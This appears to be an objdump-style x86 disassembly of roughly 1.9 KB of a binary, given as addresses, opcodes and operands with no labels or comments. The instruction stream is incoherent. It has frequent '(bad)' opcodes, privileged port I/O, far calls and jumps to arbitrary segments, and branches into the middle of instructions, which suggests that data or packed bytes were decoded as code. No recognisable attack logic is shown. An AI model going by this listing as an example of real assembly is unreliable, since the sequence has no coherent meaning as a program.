  422d46:	outs   dx,BYTE PTR ds:[esi]
  422d47:	xor    bl,0xf0
  422d4a:	das    
  422d4b:	push   0x7b
  422d4d:	sub    DWORD PTR [esi],0xea23afc0
  422d53:	rcr    DWORD PTR [edi+0x31c8f394],0x28
  422d5a:	sub    ah,BYTE PTR [ebx+0x17]
  422d5d:	inc    eax
  422d5e:	mov    bl,0x9
  422d60:	ret    0x930d
  422d63:	outs   dx,DWORD PTR ds:[esi]
  422d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d65:	sub    BYTE PTR [esi-0x38],al
  422d68:	xchg   ecx,eax
  422d69:	jbe    0x422d41
  422d6b:	xchg   ebx,eax
  422d6c:	and    dh,BYTE PTR [ebp+edi*8+0x23fead9e]
  422d73:	ret    0x7174
  422d76:	ret    0xf2e2
  422d79:	add    ch,BYTE PTR [ebx-0x2b]
  422d7c:	jns    0x422dac
  422d7e:	idiv   BYTE PTR ds:[eax]
  422d81:	ja     0x422d57
  422d83:	out    dx,eax
  422d84:	gs (bad) 
  422d86:	call   0x5910:0xf77f669f
  422d8d:	push   edi
  422d8e:	mov    gs,WORD PTR [edi+0x33daf0af]
  422d94:	scas   eax,DWORD PTR es:[edi]
  422d95:	loop   0x422d58
  422d97:	dec    edi
  422d98:	pop    esp
  422d99:	bound  esp,QWORD PTR ds:0xfcfa702e
  422d9f:	cmp    dh,BYTE PTR [ebp+0x25]
  422da2:	push   esp
  422da3:	leave  
  422da4:	push   es
  422da5:	push   ebp
  422da6:	repnz sub al,0x55
  422da9:	or     al,0x96
  422dab:	jmp    0xcf24:0xb45f3ea8
  422db2:	test   al,0x40
  422db4:	rcr    DWORD PTR [eax-0x5e],cl
  422db7:	leave  
  422db8:	(bad)  
  422db9:	pop    esi
  422dba:	fs cmc 
  422dbc:	inc    esp
  422dbd:	ret    
  422dbe:	mov    ecx,0xd119ce7b
  422dc3:	and    al,BYTE PTR [esi]
  422dc5:	sbb    edi,DWORD PTR [ebp+0x619195f3]
  422dcb:	mov    esi,0x27c5c990
  422dd0:	scas   al,BYTE PTR es:[edi]
  422dd1:	mov    dl,0xb2
  422dd3:	sub    al,0xdc
  422dd5:	mov    esi,0x46e97156
  422dda:	iret   
  422ddb:	(bad)  
  422ddc:	mov    esi,0xb09f0578
  422de1:	mov    eax,0xf3c9c8ba
  422de6:	stos   DWORD PTR es:[edi],eax
  422de7:	pushf  
  422de8:	pop    ebp
  422de9:	mov    cl,0x25
  422deb:	(bad)  
  422dec:	jbe    0x422dd5
  422dee:	mov    cl,0xa4
  422df0:	pop    es
  422df1:	stos   DWORD PTR es:[edi],eax
  422df2:	pop    eax
  422df3:	sub    dh,BYTE PTR [ecx+0x2f]
  422df6:	imul   BYTE PTR [edi-0xf]
  422df9:	into   
  422dfa:	inc    edx
  422dfb:	mov    cl,BYTE PTR [edi]
  422dfd:	mov    esi,DWORD PTR [edi]
  422dff:	add    ecx,DWORD PTR [eax-0x761f59c2]
  422e05:	xor    eax,0xd8a9d64e
  422e0a:	jne    0x422de0
  422e0c:	push   0xffffff82
  422e0e:	dec    ecx
  422e0f:	loop   0x422e86
  422e11:	out    0x19,al
  422e13:	mov    es,WORD PTR [ebp-0x4b86ebd4]
  422e19:	jae    0x422de4
  422e1b:	scas   al,BYTE PTR es:[edi]
  422e1c:	or     DWORD PTR [ecx+ebp*1+0x1f],esi
  422e20:	into   
  422e21:	dec    ebx
  422e22:	je     0x422e9d
  422e24:	sub    BYTE PTR ds:0xaf7e570f,ch
  422e2a:	adc    BYTE PTR [ecx],0xa7
  422e2d:	xchg   edx,eax
  422e2e:	add    BYTE PTR [ecx+0x43],cl
  422e31:	xchg   edx,eax
  422e32:	xchg   edx,eax
  422e33:	daa    
  422e34:	adc    DWORD PTR [ecx-0x7eba0905],ecx
  422e3a:	mov    eax,0x81ce400
  422e3f:	jno    0x422e63
  422e41:	xor    BYTE PTR [edi+0x34fa9c34],ch
  422e47:	lock rol DWORD PTR [edi-0x6c],0x80
  422e4c:	stos   DWORD PTR es:[edi],eax
  422e4d:	mov    ebx,0x1cfef82c
  422e52:	mul    BYTE PTR [edi+0x4e]
  422e55:	add    esi,DWORD PTR [esi-0x7f]
  422e58:	dec    edi
  422e59:	mov    ds:0xb9fdf67b,eax
  422e5e:	or     esi,edx
  422e60:	adc    bh,dh
  422e62:	aaa    
  422e63:	jle    0x422e89
  422e65:	pop    ebx
  422e66:	cmc    
  422e67:	xchg   edx,eax
  422e68:	and    ch,ah
  422e6a:	mov    WORD PTR [edi],?
  422e6c:	call   0x1b26:0x70bb02dd
  422e73:	repz lea ecx,[ecx-0x67]
  422e77:	cwde   
  422e78:	xor    BYTE PTR [edi-0x5b76afea],bh
  422e7e:	fdiv   DWORD PTR [ebx-0x2ec2e781]
  422e84:	retf   
  422e85:	mov    ebx,0xbb56772a
  422e8a:	shr    BYTE PTR [ebx+0x5a368021],cl
  422e90:	sub    esi,DWORD PTR [eax]
  422e92:	mov    ds:0xbd4c56f5,al
  422e97:	mov    edi,0x4463b56f
  422e9c:	mov    cl,0x76
  422e9e:	pusha  
  422e9f:	pop    ebp
  422ea0:	mov    dl,0xc6
  422ea2:	sub    BYTE PTR [ebp-0x4b559445],cl
  422ea8:	rcr    DWORD PTR [edx],1
  422eaa:	mov    dh,0xa8
  422eac:	mov    ds:0xa11458b2,eax
  422eb1:	int    0x81
  422eb3:	xchg   esp,eax
  422eb4:	ins    BYTE PTR es:[edi],dx
  422eb5:	lods   eax,DWORD PTR ds:[esi]
  422eb6:	int3   
  422eb7:	and    al,0x96
  422eb9:	inc    eax
  422eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ebb:	repz mov al,BYTE PTR [edx-0x5c]
  422ebf:	mov    esp,0x4785ed88
  422ec4:	add    DWORD PTR [edx-0x4d8bfc8c],eax
  422eca:	xchg   edx,eax
  422ecb:	pop    edi
  422ecc:	adc    ebp,DWORD PTR [esi]
  422ece:	fwait
  422ecf:	and    al,ah
  422ed1:	cmp    BYTE PTR [edi],0x43
  422ed4:	fisttp DWORD PTR [eax+eax*1-0x6272eb4e]
  422edb:	add    esi,DWORD PTR [ebp-0x1c46eafa]
  422ee1:	dec    ecx
  422ee2:	or     BYTE PTR [ecx],al
  422ee4:	les    edi,FWORD PTR [edx]
  422ee6:	mov    al,ds:0x69932d0a
  422eeb:	ret    
  422eec:	test   eax,0x7cae2af4
  422ef1:	stc    
  422ef2:	xor    esi,ebx
  422ef4:	lock dec ebp
  422ef6:	div    ebx
  422ef8:	test   eax,0x2a8d3e27
  422efd:	fdivr  QWORD PTR [ebp-0x9]
  422f00:	imul   esi,DWORD PTR [esi-0x400b74e2],0x36990a72
  422f0a:	inc    esi
  422f0b:	adc    al,0x26
  422f0d:	in     eax,0xb6
  422f0f:	mov    bl,0x4b
  422f11:	mov    ah,0x52
  422f13:	mov    bl,0x75
  422f15:	mov    ds:0x74038fa5,eax
  422f1a:	sub    eax,0x909a3eda
  422f1f:	pop    eax
  422f20:	jbe    0x422f6e
  422f22:	inc    ebp
  422f23:	cs jo  0x422f35
  422f26:	bound  ecx,QWORD PTR [ecx-0x52a444ca]
  422f2c:	xchg   ebp,eax
  422f2d:	imul   esi,DWORD PTR [esi],0xffffffb5
  422f30:	gs pusha 
  422f32:	popa   
  422f33:	das    
  422f34:	jb     0x422f68
  422f36:	mov    ch,0xae
  422f38:	inc    ebx
  422f39:	lea    eax,[eax+0x6c]
  422f3c:	sub    eax,0x6fe6f5be
  422f41:	stc    
  422f42:	or     bl,bh
  422f44:	mov    ebx,0xc2db79d7
  422f49:	sbb    edi,DWORD PTR [ecx-0x35]
  422f4c:	cdq    
  422f4d:	xchg   edi,eax
  422f4e:	mov    bl,0x3b
  422f50:	fninit 
  422f52:	inc    ebx
  422f53:	pop    edi
  422f54:	pop    edx
  422f55:	loop   0x422f3a
  422f57:	lahf   
  422f58:	push   ecx
  422f59:	sahf   
  422f5a:	fnstsw WORD PTR [ecx]
  422f5c:	pusha  
  422f5d:	cmc    
  422f5e:	aam    0xa
  422f60:	dec    ebx
  422f61:	(bad)  
  422f62:	xchg   edi,eax
  422f63:	cdq    
  422f64:	arpl   WORD PTR ds:0x5f196d3e,cx
  422f6a:	adc    esp,edx
  422f6c:	mov    cl,0x7f
  422f6e:	sahf   
  422f6f:	imul   esi,DWORD PTR [edx+eax*2-0x10],0xffffffa9
  422f74:	pop    ss
  422f75:	repnz inc esp
  422f77:	mov    ah,0x91
  422f79:	adc    dl,ah
  422f7b:	add    eax,0xb59014dd
  422f80:	or     DWORD PTR [ebx-0x2177eb9c],esi
  422f86:	imul   ebx,DWORD PTR [esi],0x50
  422f89:	mov    bl,0x2e
  422f8b:	ret    
  422f8c:	push   edx
  422f8d:	pop    esp
  422f8e:	jbe    0x422f4d
  422f90:	pushf  
  422f91:	out    dx,al
  422f92:	sbb    edx,DWORD PTR [edx+0x4da3357a]
  422f98:	dec    esp
  422f99:	icebp  
  422f9a:	pop    ss
  422f9b:	push   eax
  422f9c:	loop   0x422fd1
  422f9e:	and    edi,edi
  422fa0:	mov    eax,0xe0966978
  422fa5:	pop    esi
  422fa6:	sub    al,0x68
  422fa8:	xchg   esi,eax
  422fa9:	inc    edx
  422faa:	aad    0x64
  422fac:	sub    al,0x72
  422fae:	xchg   bh,dh
  422fb0:	loopne 0x422f4f
  422fb2:	xchg   BYTE PTR [edx+0x21],dl
  422fb5:	call   0xb94ecaac
  422fba:	aas    
  422fbb:	inc    ecx
  422fbc:	pop    esi
  422fbd:	xor    esp,DWORD PTR [edx]
  422fbf:	push   0xd6e2046e
  422fc4:	loope  0x42302c
  422fc6:	test   al,0x3f
  422fc8:	push   edx
  422fc9:	adc    ah,BYTE PTR [ebp-0x1f]
  422fcc:	push   cs
  422fcd:	fist   WORD PTR [ebp+0x49caf497]
  422fd3:	aas    
  422fd4:	inc    ebx
  422fd5:	xchg   BYTE PTR [edi+0x56],bl
  422fd8:	add    ch,BYTE PTR [esi+0x7e]
  422fdb:	xchg   edx,eax
  422fdc:	or     esi,DWORD PTR [esi-0x1f]
  422fdf:	or     al,0x60
  422fe1:	enter  0x3452,0x38
  422fe5:	xchg   edx,eax
  422fe6:	test   DWORD PTR [edi+0x3c],edi
  422fe9:	and    eax,DWORD PTR [ebx+0x30]
  422fec:	mov    es,WORD PTR [edx]
  422fee:	adc    ah,BYTE PTR [edi]
  422ff0:	(bad)  
  422ff1:	(bad)  
  422ff2:	fnstcw WORD PTR [eax]
  422ff4:	jl     0x422f7c
  422ff6:	test   BYTE PTR ds:[esi],0xdb
  422ffa:	mov    ebp,0x929f4d29
  422fff:	mov    ecx,0xc78dbd04
  423004:	mov    esp,0xb13af3f5
  423009:	aaa    
  42300a:	out    dx,eax
  42300b:	xchg   esp,eax
  42300c:	adc    BYTE PTR [edx+edx*8+0x5535a34],ch
  423013:	jp     0x422fca
  423015:	in     eax,0xc2
  423017:	popfw  
  423019:	and    bh,BYTE PTR [ebp-0x73ae06cf]
  42301f:	cmp    al,0x6e
  423021:	mov    bl,0xb2
  423023:	(bad)  
  423024:	sbb    al,0xba
  423026:	or     al,0x74
  423028:	stos   BYTE PTR es:[edi],al
  423029:	aam    0x6e
  42302b:	enter  0x6cac,0xc3
  42302f:	pop    ebp
  423030:	cmp    al,0x4
  423032:	cdq    
  423033:	sub    eax,0x807c2b70
  423038:	scas   eax,DWORD PTR es:[edi]
  423039:	pop    esi
  42303a:	add    DWORD PTR [eax+0x50bfe0f0],ecx
  423040:	adc    eax,0x68aed5fe
  423045:	pop    edx
  423046:	adc    eax,0x61d330cd
  42304b:	(bad)  
  42304c:	adc    DWORD PTR [eax+eax*8],eax
  42304f:	push   ecx
  423050:	add    al,0xf0
  423052:	mov    esp,0xe6887427
  423057:	call   DWORD PTR [ebp-0xc8bc80e]
  42305d:	fidivr WORD PTR [edx]
  42305f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423060:	int3   
  423061:	jnp    0x42304d
  423063:	test   DWORD PTR [edx],ebx
  423065:	sahf   
  423066:	cmp    edi,eax
  423068:	out    0x87,al
  42306a:	pop    ss
  42306b:	pop    eax
  42306c:	sti    
  42306d:	add    ecx,DWORD PTR [edi-0x648c9c8f]
  423073:	das    
  423074:	push   esi
  423075:	dec    edi
  423076:	rep ins DWORD PTR es:[edi],dx
  423078:	dec    ebx
  423079:	ffreep st(1)
  42307b:	sbb    edi,DWORD PTR [edi-0x160d305]
  423081:	pusha  
  423082:	(bad)
  423085:	fwait
  423086:	xchg   esi,eax
  423087:	pop    ecx
  423088:	push   ebp
  423089:	add    eax,0xcd3b9d8e
  42308e:	fimul  DWORD PTR [ecx-0x6e4424f7]
  423094:	cs fcmove st,st(3)
  423097:	mov    dh,0xe6
  423099:	and    DWORD PTR [esi-0x59],edi
  42309c:	and    ecx,DWORD PTR [eax]
  42309e:	lods   al,BYTE PTR ds:[esi]
  42309f:	shl    ecx,1
  4230a1:	xor    DWORD PTR [eax+0x4bcb06cd],esp
  4230a7:	dec    ebx
  4230a8:	sbb    al,0xee
  4230aa:	sub    eax,0x8248f85a
  4230af:	stc    
  4230b0:	jne    0x4230c7
  4230b2:	(bad)  
  4230b3:	or     DWORD PTR [edi+0x449c58ef],esi
  4230b9:	je     0x423111
  4230bb:	xor    DWORD PTR [ebp-0x34150976],edx
  4230c1:	mov    eax,0x3e79f8b2
  4230c6:	aam    0x7c
  4230c8:	sahf   
  4230c9:	xchg   DWORD PTR [edx-0x8],ebx
  4230cc:	call   0xdfeb:0xdb7c75f0
  4230d3:	enter  0xdc77,0x7f
  4230d7:	mov    ds,WORD PTR [edi]
  4230d9:	sti    
  4230da:	pop    eax
  4230db:	in     al,0xb1
  4230dd:	mov    ecx,DWORD PTR ds:0xe7a9c5d3
  4230e3:	pop    es
  4230e4:	clc    
  4230e5:	jl     0x42313e
  4230e7:	outs   dx,DWORD PTR ds:[esi]
  4230e8:	data16 and dl,BYTE PTR [esi+0x59]
  4230ec:	sub    BYTE PTR [edx],dl
  4230ee:	leave  
  4230ef:	lds    edi,FWORD PTR [esp+eax*8]
  4230f2:	retf   0x94dc
  4230f5:	dec    eax
  4230f6:	inc    ecx
  4230f7:	adc    eax,DWORD PTR [ebx]
  4230f9:	push   esp
  4230fa:	dec    edx
  4230fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230fc:	add    BYTE PTR [ebp-0x39d6ad45],dh
  423102:	shl    BYTE PTR [eax-0xaf43a3c],cl
  423108:	push   ebp
  423109:	test   al,cl
  42310b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42310c:	mov    esp,0xd3f0a238
  423111:	gs clc 
  423113:	sub    eax,0x110ac28e
  423118:	xchg   ebp,esi
  42311a:	cs int3 
  42311c:	lock cmp BYTE PTR [ecx+eiz*8+0x57],ah
  423121:	daa    
  423122:	add    bh,ch
  423124:	cmp    eax,0xe67dd8e7
  423129:	adc    DWORD PTR [edx+0x3c],esi
  42312c:	mov    ebp,0xd8cd394a
  423131:	jle    0x423175
  423133:	(bad)  
  423134:	xor    BYTE PTR [ebx+0x213a2c2f],ah
  42313a:	out    dx,al
  42313b:	jle    0x423196
  42313d:	mov    dh,BYTE PTR [ebx-0x1809a8c1]
  423143:	inc    edi
  423144:	pop    esp
  423145:	sub    DWORD PTR [ecx],0xe50941ea
  42314b:	rep stos BYTE PTR es:[edi],al
  42314d:	xchg   ebx,eax
  42314e:	mov    al,0xb9
  423150:	mov    ebx,0x314338f1
  423155:	mov    ebx,0xc66d7929
  42315a:	ret    0x6005
  42315d:	not    DWORD PTR [eax+0x43a89343]
  423163:	in     al,dx
  423164:	pop    esp
  423165:	mov    dh,0x9c
  423167:	(bad)  
  423168:	and    esp,DWORD PTR cs:0x34e525b1
  42316f:	inc    esp
  423170:	into   
  423171:	fbstp  TBYTE PTR [edi+0xef98dca]
  423177:	dec    ecx
  423178:	xchg   ebp,eax
  423179:	pop    eax
  42317a:	cdq    
  42317b:	push   ss
  42317c:	in     eax,dx
  42317d:	(bad)  
  42317e:	in     al,0xb0
  423180:	push   ebx
  423181:	data16 (bad) [ebp-0x17]
  423185:	xchg   BYTE PTR [esi-0x5d],ah
  423188:	jae    0x423119
  42318a:	cmp    al,0x88
  42318c:	or     dl,BYTE PTR [ebx+0x22f8b428]
  423192:	mov    dl,0x18
  423194:	(bad)  
  423196:	jns    0x42315c
  423198:	and    ah,BYTE PTR es:[ebp-0x44ec46d4]
  42319f:	out    dx,eax
  4231a0:	mov    BYTE PTR [ecx-0x216b557c],dl
  4231a6:	jbe    0xd916de62
  4231ac:	push   eax
  4231ad:	xchg   ecx,eax
  4231ae:	mov    ch,0xca
  4231b0:	mov    eax,DWORD PTR [edi]
  4231b2:	push   eax
  4231b3:	retf   
  4231b4:	push   eax
  4231b5:	or     dh,dl
  4231b7:	inc    edx
  4231b8:	mov    bh,0xaf
  4231ba:	pop    edx
  4231bb:	add    DWORD PTR [edx+edi*4+0x74],ebx
  4231bf:	dec    ecx
  4231c0:	(bad)  
  4231c1:	fcmovb st,st(7)
  4231c3:	jle    0x4231cf
  4231c5:	or     bl,bl
  4231c7:	stos   BYTE PTR es:[edi],al
  4231c8:	std    
  4231c9:	sbb    eax,0x120acfd9
  4231ce:	pop    esp
  4231cf:	clc    
  4231d0:	pop    es
  4231d1:	xchg   bh,bl
  4231d3:	arpl   WORD PTR [edx],ax
  4231d5:	iret   
  4231d6:	das    
  4231d7:	std    
  4231d8:	inc    edi
  4231d9:	push   eax
  4231da:	or     BYTE PTR [ebx-0x5a1bcd41],0x63
  4231e1:	sub    al,0xfa
  4231e3:	ins    BYTE PTR es:[edi],dx
  4231e4:	jg     0x4231b4
  4231e6:	ror    dl,cl
  4231e8:	and    cl,BYTE PTR [ebx]
  4231ea:	or     edx,DWORD PTR [ebx-0xc]
  4231ed:	test   BYTE PTR [eax-0xb],dh
  4231f0:	icebp  
  4231f1:	retf   
  4231f2:	fcomp  QWORD PTR [esi-0x1]
  4231f5:	pop    es
  4231f6:	ins    BYTE PTR es:[edi],dx
  4231f7:	(bad)  
  4231f9:	dec    edi
  4231fa:	loope  0x423246
  4231fc:	in     al,0x83
  4231fe:	imul   edi,DWORD PTR [edi],0xffffff83
  423201:	dec    esi
  423202:	adc    al,0x79
  423204:	dec    edi
  423205:	ret    
  423206:	(bad)  
  423208:	sbb    eax,0x4b0aed54
  42320d:	bsr    eax,DWORD PTR [edi+0x74b0cb9d]
  423214:	test   BYTE PTR [edi+eiz*1],0x56
  423218:	pop    ss
  423219:	mov    ecx,0xf7a73dbe
  42321e:	fs jmp 0x4231bd
  423221:	ins    BYTE PTR es:[edi],dx
  423222:	mov    ds:0xee4c42c1,eax
  423227:	ins    DWORD PTR es:[edi],dx
  423228:	js     0x4232a1
  42322a:	scas   eax,DWORD PTR es:[edi]
  42322b:	inc    esp
  42322c:	fcomp  QWORD PTR [ecx+0x62]
  42322f:	mov    esp,DWORD PTR [edi-0x58]
  423232:	shr    BYTE PTR [ecx],cl
  423234:	inc    esp
  423235:	iret   
  423236:	cdq    
  423237:	aas    
  423238:	pop    ss
  423239:	xchg   ebx,eax
  42323a:	pop    ss
  42323b:	mov    ds:0x61dda908,al
  423240:	outs   dx,DWORD PTR ds:[esi]
  423241:	in     eax,dx
  423242:	repz dec eax
  423244:	sub    eax,0xf0791624
  423249:	xchg   ecx,eax
  42324a:	jne    0x42324a
  42324c:	lock mov ebx,0xfa97cedf
  423252:	das    
  423253:	lock stos BYTE PTR es:[edi],al
  423255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423256:	fstp   TBYTE PTR [ecx]
  423258:	mov    ebx,0x699b0778
  42325d:	fstsw  WORD PTR [eax-0x77]
  423261:	fld    TBYTE PTR [esi-0x41]
  423264:	xchg   edi,eax
  423265:	addr16 cs aaa 
  423268:	push   0xb062ce3c
  42326d:	adc    cl,BYTE PTR [edi+0x9]
  423270:	jmp    0xceee:0x52463905
  423277:	jb     0x423254
  423279:	je     0x4232be
  42327b:	push   ecx
  42327c:	xchg   ecx,eax
  42327d:	push   esp
  42327e:	enter  0xb2bb,0x18
  423282:	inc    esi
  423283:	add    BYTE PTR [ecx-0x55],dl
  423286:	mov    esp,0x6ba3d108
  42328b:	loop   0x4232cf
  42328d:	in     al,dx
  42328e:	jns    0x42329d
  423290:	mov    ebp,DWORD PTR fs:[edi]
  423293:	jmp    0x177f:0x79b3df0
  42329a:	outs   dx,BYTE PTR ds:[esi]
  42329b:	in     eax,0x8d
  42329d:	fxch   st(7)
  42329f:	repnz xchg esp,eax
  4232a1:	nop
  4232a2:	sub    BYTE PTR [esi-0x59d5ff79],bl
  4232a8:	js     0x423234
  4232aa:	sub    esp,eax
  4232ac:	push   ss
  4232ad:	xor    esp,DWORD PTR [edi+edx*2-0x32]
  4232b1:	scas   eax,DWORD PTR es:[edi]
  4232b2:	xor    esi,ebp
  4232b4:	mov    esi,0x5209478b
  4232b9:	jmp    0x4b1e92c3
  4232be:	xchg   ebp,eax
  4232bf:	cmp    DWORD PTR [ebx],eax
  4232c1:	jne    0x4232b1
  4232c3:	inc    ebp
  4232c4:	and    BYTE PTR [edi],dh
  4232c6:	and    ch,cl
  4232c8:	push   esi
  4232c9:	sahf   
  4232ca:	jb     0x4232aa
  4232cc:	inc    ecx
  4232cd:	xor    bh,al
  4232cf:	and    eax,0xcc1059c2
  4232d4:	pop    eax
  4232d5:	cmp    ebx,DWORD PTR [esi+esi*8+0x50]
  4232d9:	bound  edx,QWORD PTR [esi]
  4232db:	(bad)  
  4232dc:	xchg   esp,eax
  4232dd:	ret    
  4232de:	jge    0x42331a
  4232e0:	and    al,0x5d
  4232e2:	xchg   ebp,eax
  4232e3:	(bad)
  4232e7:	loop   0x423331
  4232e9:	cmp    esp,esp
  4232eb:	std    
  4232ec:	mov    ds:0x82b853cb,eax
  4232f1:	and    edi,DWORD PTR [ebx]
  4232f3:	shl    DWORD PTR [eax],1
  4232f5:	out    0xdc,eax
  4232f7:	pop    ebp
  4232f8:	daa    
  4232f9:	stc    
  4232fa:	lea    eax,[ebx-0x292a53b5]
  423300:	pop    es
  423301:	repnz xor BYTE PTR [ebp+0xe],al
  423305:	fcmovne st,st(0)
  423307:	scas   al,BYTE PTR es:[edi]
  423308:	call   0x3dc8:0x538557b0
  42330f:	adc    DWORD PTR [ebp+0x5f],ebp
  423312:	xor    DWORD PTR [edx],0x47
  423315:	xchg   ecx,eax
  423316:	jle    0x423358
  423318:	lahf   
  423319:	ins    DWORD PTR es:[edi],dx
  42331a:	repnz mov ch,0x18
  42331d:	jp     0x42337a
  42331f:	stos   DWORD PTR es:[edi],eax
  423320:	push   ecx
  423321:	icebp  
  423322:	sub    al,0x3f
  423324:	mov    cl,0xa8
  423326:	das    
  423327:	(bad)  
  423328:	cmc    
  423329:	and    al,0x31
  42332b:	inc    eax
  42332c:	lods   eax,DWORD PTR ds:[esi]
  42332d:	loop   0x423339
  42332f:	pop    ecx
  423330:	ror    dl,1
  423332:	jp     0x42337e
  423334:	mov    edx,0x72cf63cf
  423339:	xor    BYTE PTR [ebp+0x9],al
  42333c:	fst    QWORD PTR [edi+0x2b]
  42333f:	mov    edi,0xc82f6f37
  423344:	add    eax,0xbebbffb8
  423349:	dec    ebx
  42334a:	aas    
  42334b:	stc    
  42334c:	fistp  QWORD PTR [edi-0x16]
  42334f:	cli    
  423350:	push   eax
  423351:	and    al,0xe2
  423353:	ret    0x9d9c
  423356:	cld    
  423357:	loop   0x423345
  423359:	out    0x50,eax
  42335b:	ror    al,0xd9
  42335e:	jg     0x42337e
  423360:	dec    eax
  423361:	loopne 0x423319
  423363:	xchg   edi,eax
  423364:	mov    cl,0x42
  423366:	xor    BYTE PTR ds:0x3c3eff62,al
  42336c:	ins    BYTE PTR es:[edi],dx
  42336d:	or     ebx,ebx
  42336f:	xchg   esp,edx
  423371:	rol    DWORD PTR [esi-0x2754262b],cl
  423377:	pushf  
  423378:	jge    0x423318
  42337a:	push   edi
  42337b:	fbstp  TBYTE PTR [ecx+0x2f]
  42337e:	(bad)  
  42337f:	jl     0x42337a
  423381:	ja     0x423313
  423383:	sbb    eax,eax
  423385:	mov    ds:0xb65b27a2,al
  42338a:	in     al,0x9
  42338c:	call   0x1efdcdfb
  423391:	out    0xfe,eax
  423393:	dec    edi
  423394:	jge    0x4233d5
  423396:	xlat   BYTE PTR ds:[ebx]
  423397:	cs ins BYTE PTR es:[edi],dx
  423399:	jb     0x42337d
  42339b:	div    BYTE PTR [ebx-0x1fa76054]
  4233a1:	cli    
  4233a2:	(bad)  
  4233a3:	(bad)  
  4233a4:	xchg   edi,eax
  4233a5:	lods   al,BYTE PTR ds:[esi]
  4233a6:	into   
  4233a7:	or     ax,0xe327
  4233ab:	sub    al,0xe9
  4233ad:	inc    ebp
  4233ae:	cld    
  4233af:	sbb    DWORD PTR [edx-0x78abb50],ebp
  4233b5:	pop    edx
  4233b6:	mov    ebx,0xf0e2ca95
  4233bb:	sar    DWORD PTR [ebp+0x72],0xd
  4233bf:	dec    edx
  4233c0:	nop
  4233c1:	gs mov eax,0x5aaa76fa
  4233c7:	push   0x79b1b844
  4233cc:	popf   
  4233cd:	ud0    ebx,DWORD PTR [ebx-0x48048785]
  4233d4:	pop    ebp
  4233d5:	in     eax,0x17
  4233d7:	jg     0x4233d2
  4233d9:	push   ds
  4233da:	jbe    0x42339f
  4233dc:	push   es
  4233dd:	xchg   edx,eax
  4233de:	push   0x2a
  4233e0:	cdq    
  4233e1:	push   eax
  4233e2:	xchg   DWORD PTR [edi-0x17],esp
  4233e5:	fcmovnbe st,st(7)
  4233e7:	xor    ecx,DWORD PTR [ebp-0x77]
  4233ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233eb:	dec    ecx
  4233ec:	int    0xde
  4233ee:	test   BYTE PTR [ecx],0x82
  4233f1:	mov    cl,0xbc
  4233f3:	add    bl,BYTE PTR [edi+ebx*2]
  4233f6:	aas    
  4233f7:	inc    esi
  4233f8:	pop    ss
  4233f9:	cmp    ah,dh
  4233fb:	out    dx,al
  4233fc:	outs   dx,DWORD PTR ds:[esi]
  4233fd:	jecxz  0x42338b
  4233ff:	scas   eax,DWORD PTR es:[edi]
  423400:	sbb    DWORD PTR [ebp-0x39d0eaf6],esp
  423406:	jno    0x4233d4
  423408:	outs   dx,BYTE PTR ds:[esi]
  423409:	repnz es inc edi
  42340c:	xchg   ebx,edx
  42340e:	bound  edi,QWORD PTR [ebp+0x36]
  423411:	int3   
  423412:	cs in  al,0x19
  423415:	push   ebp
  423416:	sub    ebx,ecx
  423418:	jmp    0x280a:0x6a8e8cdb
  42341f:	or     esp,DWORD PTR [eax-0x646114c8]
  423425:	je     0x42340d
  423427:	jnp    0x423451
  423429:	scas   eax,DWORD PTR es:[edi]
  42342a:	xor    BYTE PTR ds:0x2dc5022e,cl
  423430:	mov    al,0x31
  423432:	dec    ebx
  423433:	sub    al,BYTE PTR [eax+ebp*1-0x246fdde7]
  42343a:	jp     0x423451
  42343c:	mov    dl,0x2f
  42343e:	or     esi,DWORD PTR [eax+0x22f17e4f]
  423444:	sub    bl,BYTE PTR [ebx-0x2c]
  423447:	and    eax,DWORD PTR [edi+0x46bbed03]
  42344d:	xor    DWORD PTR [eax+0x4f76493b],edi
  423453:	jb     0x423458
  423455:	push   esi
  423456:	dec    edx
  423457:	es pusha 
  423459:	pop    esi
  42345a:	jns    0x4234d5
  42345c:	dec    eax
  42345d:	pop    ebp
  42345e:	data16 adc BYTE PTR [edi+esi*4-0x8],ch
  423463:	leave  
  423464:	pop    ebp
  423465:	xchg   esp,eax
  423466:	xor    al,0x82
  423468:	call   FWORD PTR [ecx+0x59]
  42346b:	sub    DWORD PTR [esi+0x510c04dc],edx
  423471:	add    DWORD PTR ds:0xef33f96a,edi
  423477:	sub    BYTE PTR [eax],0xd2
  42347a:	cs jae 0x4234fa
  42347d:	loope  0x423480
  42347f:	stos   BYTE PTR es:[edi],al
  423480:	dec    esi
  423481:	pop    ecx
  423482:	stos   DWORD PTR es:[edi],eax
  423483:	sub    ah,BYTE PTR [edx-0x26b125ba]
  423489:	dec    edi
  42348a:	mov    esi,0xda891262
  42348f:	and    ebx,DWORD PTR ds:0x2b7a1551
  423495:	aad    0xa
  423497:	mov    BYTE PTR [ecx-0x1a0b9bf5],bh
  42349d:	jecxz  0x4234be
  42349f:	ins    DWORD PTR es:[edi],dx
  4234a0:	sbb    eax,0xf4874e86
  4234a5:	jmp    0x320a:0x25785639
  4234ac:	leave  
  4234ad:	aam    0xaf
  4234af:	mov    al,ds:0x15f55021
  4234b4:	scas   al,BYTE PTR es:[edi]
  4234b5:	std    
  4234b6:	ins    DWORD PTR es:[edi],dx
  4234b7:	cld    
  4234b8:	inc    ebp
  4234b9:	xchg   BYTE PTR [edi-0x68],ah
  4234bc:	xor    eax,0x8ffffa20
  4234c1:	add    al,BYTE PTR [eax]
  4234c3:	or     BYTE PTR [edi+edx*1+0x3b],dl
  4234c7:	ins    DWORD PTR es:[edi],dx
  4234c8:	pop    ebp
  4234c9:	(bad)  
  4234ca:	xor    eax,0x485aa3b
  4234cf:	jl     0x42347f
  4234d1:	sbb    esi,eax
  4234d3:	jl     0x423505
  4234d5:	mov    al,ds:0x4bfc387c
  4234da:	mov    ch,0xa0
  4234dc:	or     BYTE PTR [ebx+0x6d12526a],al
  4234e2:	bound  edx,QWORD PTR [edi]
  4234e4:	xchg   ecx,eax
  4234e5:	and    ah,cl
  4234e7:	pop    ds
  4234e8:	cmp    BYTE PTR [edi-0x25],al
  4234eb:	lods   al,BYTE PTR ds:[esi]
  4234ec:	jo     0x4234b5
